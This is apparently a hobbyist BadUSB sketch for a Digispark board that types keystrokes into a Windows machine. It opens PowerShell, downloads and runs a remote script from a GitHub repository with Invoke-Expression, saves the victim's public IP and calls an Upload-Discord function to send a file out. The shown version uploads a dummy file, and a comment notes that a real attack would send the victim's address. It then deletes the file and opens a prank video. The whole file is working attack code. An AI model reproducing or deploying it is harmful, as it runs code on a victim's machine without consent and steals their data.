#include "DigiKeyboard.h"

void setup() {

  // The suggested delay can be changed, depending on your needs or constraints

  // Opens PowerShell with the Windows Run shortcut
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  DigiKeyboard.delay(1500);
  // gets the Upload-Discord function from our GitHub Repo
  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1"); 
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)"); // runs the acquired script so Upload-Discord is enabled

  DigiKeyboard.delay(1500);
  DigiKeyboard.println("(Invoke-WebRequest -uri 'http://ifconfig.me/ip').Content | Out-File -FilePath userIP.txt");
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Upload-Discord -file 'dummy.txt'"); // It will send a dummy file for privacy reasons.
                                                            // in a real attack, the victim's address won't be so lucky.
  DigiKeyboard.delay(1800);
  DigiKeyboard.println("rm userIP.txt"); // deletes the compromised file

  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Start-Process 'https://youtu.be/dQw4w9WgXcQ?t=43s'"); // opens youtube with a Rick Roll

  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // Alt + Tab back into PowerShell

  DigiKeyboard.delay(1500); 
  DigiKeyboard.println("exit"); // quits the PowerShell window

  // Developed by TEAM ECHO - BADUSB
  // with DIGISPARK
  // January 25th, 2024
}


void loop() {
  // BRANCH A - EMPTY
}
